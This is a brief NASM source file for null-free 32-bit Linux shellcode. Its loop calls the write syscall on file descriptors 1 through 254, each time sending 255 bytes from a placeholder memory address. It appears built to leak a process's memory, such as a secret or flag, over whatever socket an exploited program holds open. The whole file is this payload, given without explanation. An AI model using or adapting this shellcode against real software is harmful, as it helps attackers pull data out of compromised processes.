;
;	assemble with nasm sc.asm -o sc.bin
;

USE32
	section .data	; for testing
	global _start

; setup env
_start:
	xor eax, eax
	mov al, 0x20
	shl eax, 0x8
	sub esp, eax	; esp - 0x1000
	xor ebx, ebx
	xor esi, esi
	xor ecx, ecx
	mul ecx		; edx:eax = 0

; write data to all fds, from 0x4 to 0xff - 1
write:
	mov edx, eax
	xor ebx, ebx
	mov bl, 0xff
	mov edi, ebx
	xor ebx, ebx
	mov bl, 0x1
do:
	cmp edi, ebx
	je exit
	mov ecx, 0x5a5a5a5a
    mov byte [ecx], bl
	mov dl, 0xff
	xor eax, eax	
	mov al, 0x4
	int 80h
	inc ebx
	jmp do

exit:
	xor eax, eax
	mov al, 0x1
	int 80h
